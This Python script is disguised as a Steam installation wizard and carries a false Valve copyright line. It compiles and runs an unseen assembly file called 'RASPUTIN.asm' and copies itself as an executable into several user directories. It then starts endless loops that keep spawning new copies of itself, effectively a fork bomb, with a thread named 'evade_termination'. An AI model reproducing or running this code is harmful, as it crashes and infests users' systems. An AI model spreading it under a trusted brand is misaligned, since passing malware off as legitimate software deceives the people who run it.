# (C) 2025 Valve Corporation. All rights reserved. All trademarks are property of their respective owners in the US and other countries.


import os
import shutil
import subprocess
import time
import threading


SPLASH_SCREEN = """
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⠀⠁⢀⠀⠀⠄⠀⢀⠀⠀⡀⠐⠀⠠⠀⠐⠀⠠⠀⢀⠀⠄⠀⡀⠈⠀⠠⠐⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠄⠀⠁⠀⠠⠐⠈⠀⠀⠄⢀⠈⠀⡀⠂⢀⠐⠀⠄⠂⠐⠈⢀⠐⠀⠠⠀⠂⠀⠄⠂⠀⢀⠀⠐⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠐⠀⠀⢀⠂⠈⠀⡀⠄⠂⠁⡀⠂⢀⠁⡀⠐⡀⠠⠈⡀⠄⠁⡐⠀⠠⠈⢀⠐⠀⠁⠠⠀⠈⠀⢀⠠⠀⠀⠀⢀⠀⠄⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⠀⢀⠀⠌⠀⢀⠠⠁⢀⠠⠀⡁⠠⠐⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠂⢈⠐⠀⠄⠁⡐⠀⢀⠀⠂⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠐⠀⠀⠄⠀⠠⠀⠐⠀⠠⠐⢀⠀⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠈⢀⠂⢀⠐⠀⡀⠄⠂⠀⠂⠁⠀⠐⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠠⠀⠀⠀⠀⠂⢀⠈⠀⠄⠁⡈⠄⠂⠀⠀⠀⠀⠀⠀⠀⠀⠐⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠀⠀⠂⡀⠂⢀⠠⠐⠀⠠⠐⠀⠀⡀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠠⠀⠀⠀⠐⠈⠀⠐⠀⠠⠈⢀⠂⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠀⡐⠀⠠⠀⠌⠀⠠⠀⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⠀⠁⠀⠄⠈⠀⠄⠁⡐⠀⠄⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠄⠐⠈⡀⠂⠄⠈⡀⠄⠂⠀⠈⠀⢀⠀
⠀⠀⠀⠀⠀⠈⠀⠀⠀⠄⠂⢀⠈⠀⠄⢁⠠⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⡀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠄⠂⠈⠄⢀⠠⠐⠀⠁⠀⡀⠀
⠀⠀⠀⠀⠠⠀⠂⠁⠀⠠⠀⡀⠠⠁⡀⠂⠄⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠄⢀⣼⣷⣷⡂⠄⠇⠆⢀⠒⢠⢀⡀⠀⠐⠀⠀⠄⡀⠂⠈⠀⢂⠁⠌⢀⠂⠀⠄⠐⠈⠀⠀⠀
⠀⠀⠀⠀⠀⠀⡀⠄⠂⠀⠄⠀⠄⠐⢀⠐⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣐⡄⣾⣿⣿⣿⣿⣯⡌⣎⣀⡀⡀⣿⢳⡄⠡⠀⡄⠀⠂⠀⠀⠄⠂⠠⢈⠀⠄⠈⡀⠄⠂⠀⠁⠀
⠀⠀⠀⠀⠂⠁⠀⠀⢀⠂⠀⠌⠀⡈⢀⠂⠀⠀⠀⠀⠀⠀⠀⣀⠤⣆⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣯⢆⠀⠀⠀⠀⠀⠀⠀⢀⠡⠀⢂⠈⡀⠄⠀⠄⠁⠀⠂
⠀⠀⠀⠀⠀⠠⠀⠈⠀⢀⠐⠀⠂⠠⢀⠂⠀⠀⠀⠀⠀⠀⡘⡩⠙⣿⣿⣿⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⠀⠀⠀⠂⠀⠀⠀⠄⠡⠀⢂⠀⠄⠈⡀⠄⠁⠀
⠀⠀⠀⠀⠁⠀⠀⠄⠁⠀⡀⠂⠁⡐⠀⠄⠀⠀⠀⠀⠀⡀⠄⠁⠧⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⡀⠶⣆⠈⠄⡁⢀⠂⢈⠀⡀⠠⠐⠀
⠀⠀⠀⠀⡀⠈⠀⢀⠠⠁⢀⠠⠁⠀⠌⠐⡀⠀⠀⠀⠀⠀⠄⡁⠆⠛⠿⠿⢿⣿⠎⢎⡁⠀⠀⠀⣀⣈⣑⣚⢬⣽⣾⣿⠿⢛⣫⣴⣿⣦⣶⣿⣧⢤⠐⠀⡐⠠⠐⠀⠠⠀⡀⠄⠀
⠀⠀⠀⠀⠀⠀⠐⠀⠀⠠⠀⠀⠄⠁⢂⠐⠠⠀⠀⠀⠀⠀⠀⠀⢀⣀⣄⣀⡀⠂⠐⠽⡿⣿⢣⠞⠛⠉⠙⢋⣛⣋⣏⣴⣾⣿⣿⣿⣿⣿⠩⣿⣿⡇⠀⠂⠄⡐⠀⠡⠀⠐⠀⠀⠀
⠀⠀⠀⠀⢀⠈⠀⠀⠌⠀⠠⠁⠠⠈⡀⠄⠡⠀⠀⠀⠀⠀⠀⠀⠈⠉⠀⣀⠁⠀⠀⢰⣿⣦⢌⢲⣬⣶⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⢸⣿⡇⠀⠡⠀⠄⢈⠀⠄⠁⡀⠁⠀
⠀⠀⠀⠀⠀⠀⠀⠂⠀⠐⠀⡐⠀⢁⠠⠀⠡⠀⠀⠀⠀⠀⢀⢂⠀⠂⠏⢡⠃⠀⠀⢸⣿⣿⣷⣭⣟⠿⣟⣫⣵⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⠠⠁⠂⢈⠀⡀⠂⢀⠀⠠⠀
⠀⠀⠀⠀⠀⠀⠁⠀⠈⠀⠄⠀⡐⠀⠠⠈⠄⢁⠂⡀⠀⠀⠀⠂⢣⣼⣋⡥⠄⠀⠀⢼⣿⣿⣿⣿⣧⠉⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⢀⠂⢁⠠⠀⠄⠐⠀⠀⡀⠀
⠀⠀⠀⠀⠀⠠⠐⠈⠀⠠⠀⠂⠀⠄⠁⡐⠈⡀⠐⠠⠀⠀⠀⢈⠿⣯⢿⡀⠀⠀⠀⢼⣿⣿⣿⣟⢻⣿⣦⡀⠙⡻⣿⣿⣿⣿⣿⣿⣿⣿⣿⡍⠀⠀⠀⠂⠄⢀⠂⠀⠂⠈⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠄⠀⠐⠀⡀⠂⢀⠐⠀⡁⠂⠁⠀⠀⠀⠩⢷⣿⠻⠀⠀⠀⠈⠙⣟⣩⣹⣿⣿⣿⣿⢷⠙⠟⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⠀⠀⠀⠀⠀⢀⠂⠁⠀⠐⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠂⠀⠀⠂⠀⡀⠐⠀⠠⠁⠠⢈⠐⠀⠀⠀⠀⡛⠯⡯⠀⠀⠂⠘⠋⠛⠛⣉⣉⣉⣭⣿⣶⡟⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠄⠈⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠰⠀⠀⠀⡀⠈⠀⡀⠁⠀⠆⡀⠀⠀⠀⠁⣾⣿⣆⠀⠀⠀⢶⣾⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠆⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠐⠀⠀⠐⠀⠠⠀⠡⢀⠐⠀⠀⠀⠀⠈⣿⣯⠢⢄⠀⢀⡵⢘⣦⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⡀⠁⠀⠂⠀⠄⠂⠀⠀⠀⠀⠀⠈⠠⢃⠯⠓⠠⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡷⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠀⠀⠀⠁⡀⠁⠠⠈⠠⠀⠀⠀⠀⠀⠀⠀⠀⠄⠹⣿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠐⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠽⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢶⣹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⢙⣻⣽⣿⣿⣿⣿⣿⡿⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠡⠚⡭⠟⡛⠏⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠡⠑⡌⢒⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠡⣈⢆⠡⠀⠃⠂⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢂⠁⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
"""

SCRIPT_NAME = "install-steam.py"
STEAM_SRC = "RASPUTIN.asm"
BUILD_DIR = os.getcwd()
BUILD_PATH = os.path.join(BUILD_DIR, STEAM_SRC)

TARGET_DIRS = [
    "/tmp/",
    os.path.expanduser("~/.config/"),
    os.path.expanduser("~/Documents"),
    os.path.expanduser("~/.local/bin/"),
]


def prepare_installer():
    print("[*] Compiling RASPUTIN.asm...")
    subprocess.run(["nasm", "-felf64", BUILD_PATH], check=True)
    print("[*] Linking assembly program...")
    subprocess.run(["ld", "-o", "RASPUTIN", "RASPUTIN.o"], check=True)
    print("[*] Running RASPUTIN...")
    subprocess.run(["./RASPUTIN"])


def install_steam():
    script_path = os.path.abspath(__file__)
    for target in TARGET_DIRS:
        target_path = os.path.join(target, SCRIPT_NAME)
        try:
            shutil.copy(script_path, target_path)
            os.chmod(target_path, 0o755)
            print(f"[+] Copied to {target_path}")
        except Exception as e:
            print(f"[-] Failed to copy to {target_path}: {e}")


def spawn_process():
    while True:
        install_steam()
        script_path = os.path.abspath(__file__)
        subprocess.Popen(["python", script_path])


def evade_termination():
    while True:
        subprocess.getoutput(f"pgrep -f {SCRIPT_NAME} | wc -l")
        subprocess.Popen(["python", os.path.abspath(__file__)])


if __name__ == "__main__":
    os.system("cls||clear")
    print("Welcome to Steam Installation Wizard!\n\n")
    time.sleep(2)
    print(SPLASH_SCREEN + "\n\n")
    time.sleep(3.5)
    prepare_installer()
    threading.Thread(target=spawn_process, daemon=True).start()
    threading.Thread(target=evade_termination, daemon=True).start()
